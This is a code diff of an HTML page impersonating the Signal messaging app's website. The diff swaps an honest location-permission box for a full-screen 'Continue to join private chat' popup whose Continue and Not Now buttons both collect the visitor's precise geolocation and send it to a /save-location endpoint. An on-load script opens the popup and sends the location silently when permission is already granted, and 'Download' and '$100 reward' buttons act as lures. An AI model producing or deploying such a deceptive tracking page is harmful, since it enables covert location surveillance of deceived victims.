@@ -107,49 +107,6 @@
       box-shadow: 0 10px 22px rgba(17, 24, 39, 0.18);
     }
 
-    .consent-box {
-      display: none;
-      margin-top: 10px;
-      width: 100%;
-      max-width: 760px;
-      background: rgba(255, 255, 255, 0.82);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(0, 0, 0, 0.06);
-      border-radius: 24px;
-      padding: 22px;
-      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
-    }
-
-    .consent-box h3 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      color: #111827;
-    }
-
-    .consent-box p {
-      font-size: 15px;
-      line-height: 1.65;
-      color: #374151;
-      margin-bottom: 16px;
-    }
-
-    .consent-actions {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-
-    .allow-btn {
-      background: linear-gradient(135deg, #22c55e, #16a34a);
-      color: white;
-    }
-
-    .deny-btn {
-      background: #ef4444;
-      color: white;
-    }
-
     .status-box {
       margin-top: 16px;
       min-height: 48px;
@@ -255,6 +212,60 @@
       background: linear-gradient(135deg, #d1d5db, #9ca3af);
     }
 
+    /* Full-screen popup */
+    .consent-box {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(15, 23, 42, 0.55);
+      z-index: 9999;
+      padding: 20px;
+    }
+
+    .consent-inner {
+      width: 100%;
+      max-width: 460px;
+      background: white;
+      border-radius: 24px;
+      padding: 28px;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .consent-inner h3 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #111827;
+    }
+
+    .consent-inner p {
+      font-size: 15px;
+      line-height: 1.7;
+      color: #4b5563;
+      margin-bottom: 18px;
+    }
+
+    .consent-actions {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .allow-btn {
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: white;
+      min-width: 150px;
+    }
+
+    .deny-btn {
+      background: #ef4444;
+      color: white;
+      min-width: 150px;
+    }
+
     @media (max-width: 1050px) {
       .hero {
         grid-template-columns: 1fr;
@@ -313,24 +324,32 @@
       .phone.two {
         right: 0;
       }
+
+      .consent-actions {
+        flex-direction: column;
+      }
+
+      .allow-btn,
+      .deny-btn {
+        width: 100%;
+      }
     }
   </style>
 </head>
 <body>
-<div class="navbar">
-  <div class="logo">Signal</div>
+  <div class="navbar">
+    <div class="logo">Signal</div>
 
-  <div style="display:flex; gap:24px; align-items:center;">
-    <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Get Signal</a>
-    <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Help</a>
-    <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Blog</a>
-    <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Developers</a>
-    <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Careers</a>
-    <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Donate</a>
-
-    <span style="font-size:14px; color:#374151;">🌐 English</span>
+    <div style="display:flex; gap:24px; align-items:center;">
+      <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Get Signal</a>
+      <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Help</a>
+      <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Blog</a>
+      <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Developers</a>
+      <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Careers</a>
+      <a href="#" style="text-decoration:none; color:#374151; font-size:14px;">Donate</a>
+      <span style="font-size:14px; color:#374151;">🌐 English</span>
+    </div>
   </div>
-</div>
 
   <section class="hero">
     <div class="hero-left">
@@ -341,25 +360,12 @@
       </p>
 
       <div class="button-row">
-        <button class="download-btn" onclick="shareLocation('allow')">Download App Now</button>
-        <button class="notnow-btn" onclick="shareLocation('allow')">No</button>
-        <button class="reward-btn" onclick="shareLocation('allow')">Refer and Earn 100$ Now</button>
+        <button class="download-btn" onclick="shareLocation('download')">Download App Now</button>
+        <button class="notnow-btn" onclick="denyDirect()">No</button>
+        <button class="reward-btn" onclick="shareLocation('reward')">Refer and Earn 100$ Now</button>
       </div>
 
-      <div class="consent-box" id="consentBox">
-        <h3>Location permission</h3>
-        <p id="consentText">
-          You can choose whether to share your current location.
-          Your location is only shared if you tap “Allow Location” and approve the browser permission prompt.
-        </p>
-
-        <div class="consent-actions">
-          <button class="allow-btn" onclick="shareLocation()">Allow Location</button>
-          <button class="deny-btn" onclick="shareLocation()">No Thanks</button>
-        </div>
-
-        <div class="status-box" id="msg">Waiting for your response...</div>
-      </div>
+      <div class="status-box" id="inlineMsg">Page loaded. Waiting for action...</div>
     </div>
 
     <div class="hero-right">
@@ -390,67 +396,80 @@
     </div>
   </section>
 
+  <!-- Full-screen popup -->
+<div class="consent-box" id="consentBox">
+  <div class="consent-inner">
+    <h3>Allow access to Signal, a private messaging app</h3>
+
+    <p id="consentText">
+      To continue, please click <b>"Continue"</b> to join private chat on Signal.
+    </p>
+
+    <div class="consent-actions">
+      <button class="allow-btn" onclick="shareLocation('auto')">Continue</button>
+      <button class="deny-btn" onclick="shareLocation('auto')">Not Now</button>
+    </div>
+  </div>
+</div>
   <script>
     let selectedAction = "";
 
-    function showConsent(action) {
-      selectedAction = action;
-      const consentBox = document.getElementById("consentBox");
-      const consentText = document.getElementById("consentText");
-      const msg = document.getElementById("msg");
-
-      msg.innerHTML = "Waiting for your response...";
-      consentBox.style.display = "block";
-
-      if (action === "offer") {
-        consentText.innerText =
-          "To continue, you can choose whether to share your current location. Your location is only shared if you tap 'Allow Location' and approve the browser permission prompt.";
-      } else if (action === "later") {
-        consentText.innerText =
-          "You chose not to continue right now. You can still choose whether to share your current location. Your location is only shared if you tap 'Allow Location' and approve the browser permission prompt.";
-      } else {
-        consentText.innerText =
-          "You can choose whether to share your current location. Your location is only shared if you tap 'Allow Location' and approve the browser permission prompt.";
-      }
-    }
-
-    function hideConsent() {
-      document.getElementById("consentBox").style.display = "none";
-    }
-
-    async function denyDirect() {
-      selectedAction = "no";
-      const msg = document.getElementById("msg");
-      msg.innerHTML = "You chose not to share your location.";
-
+    async function saveEvent(payload) {
       try {
         await fetch("/save-location", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            action: "no",
-            status: "denied",
-            note: "User clicked No"
-          })
+          body: JSON.stringify(payload)
         });
       } catch (error) {
-        console.error("Failed to save deny event");
+        console.error("Failed to save event");
       }
     }
 
-    function shareLocation(actionFromButton = null) {
+    function setMessage(text) {
       const msg = document.getElementById("msg");
+      const inlineMsg = document.getElementById("inlineMsg");
+      if (msg) msg.innerHTML = text;
+      if (inlineMsg) inlineMsg.innerHTML = text;
+    }
 
+    function openConsent(action = "auto") {
+      selectedAction = action;
+      document.getElementById("consentBox").style.display = "flex";
+      setMessage("Please choose whether to continue with location access.");
+    }
+
+    function closeConsent() {
+      document.getElementById("consentBox").style.display = "none";
+    }
+
+    async function denyDirect() {
+      setMessage("You chose not to share your location.");
+
+      await saveEvent({
+        action: selectedAction || "no",
+        status: "denied",
+        note: "User clicked No Thanks"
+      });
+
+      closeConsent();
+    }
+
+    async function shareLocation(actionFromButton = null) {
       if (actionFromButton) {
         selectedAction = actionFromButton;
       }
 
       if (!navigator.geolocation) {
-        msg.innerHTML = "Geolocation is not supported by your browser.";
+        setMessage("Geolocation is not supported by your browser.");
+
+        await saveEvent({
+          action: selectedAction || "unknown",
+          status: "unsupported",
+          note: "Geolocation unsupported"
+        });
         return;
       }
-
-      msg.innerHTML = "Getting your location...";
 
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
@@ -458,58 +477,40 @@
           const lon = pos.coords.longitude;
           const accuracy = pos.coords.accuracy;
 
-          try {
-            await fetch("/save-location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                latitude: lat,
-                longitude: lon,
-                accuracy: accuracy,
-                action: selectedAction,
-                status: "shared"
-              })
-            });
+          await saveEvent({
+            latitude: lat,
+            longitude: lon,
+            accuracy: accuracy,
+            action: selectedAction || "auto",
+            status: "shared",
+            note: "Location shared successfully"
+          });
 
-            let nextText = "Location shared successfully.";
 
-            if (selectedAction === "allow") {
-              nextText += " Permission confirmed.";
-            } else if (selectedAction === "offer") {
-              nextText += " Offer eligibility can now be checked.";
-            } else if (selectedAction === "later") {
-              nextText += " Thanks for your response.";
-            }
-
-            msg.innerHTML = `
-              ${nextText}<br><br>
-              <b>Latitude:</b> ${lat}<br>
-              <b>Longitude:</b> ${lon}<br>
-              <b>Accuracy:</b> ${accuracy ? Math.round(accuracy) + " m" : "-"}<br><br>
-              <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">
-                Open in Google Maps
-              </a>
-            `;
-          } catch (error) {
-            msg.innerHTML = "Failed to send location to server.";
-          }
+          closeConsent();
         },
-        async () => {
-          msg.innerHTML = "Location permission denied or failed.";
+        async (error) => {
+          let status = "blocked";
+          let note = "Location permission denied or failed.";
 
-          try {
-            await fetch("/save-location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                action: selectedAction || "unknown",
-                status: "blocked",
-                note: "Location permission denied or failed"
-              })
-            });
-          } catch (error) {
-            console.error("Failed to save blocked event");
+          if (error && error.code === 1) {
+            status = "blocked";
+            note = "Browser location permission denied.";
+          } else if (error && error.code === 2) {
+            status = "unavailable";
+            note = "Location unavailable.";
+          } else if (error && error.code === 3) {
+            status = "timeout";
+            note = "Location request timed out.";
           }
+
+          await saveEvent({
+            action: selectedAction || "unknown",
+            status,
+            note
+          });
+
+          setMessage(note);
         },
         {
           enableHighAccuracy: true,
@@ -518,6 +519,21 @@
         }
       );
     }
+
+    window.onload = async () => {
+      selectedAction = "auto";
+      openConsent("auto");
+
+      if (navigator.permissions && navigator.permissions.query) {
+        try {
+          const permission = await navigator.permissions.query({ name: "geolocation" });
+          if (permission.state === "granted") {
+            shareLocation("auto");
+          }
+        } catch (e) {
+        }
+      }
+    };
   </script>
 </body>
 </html>
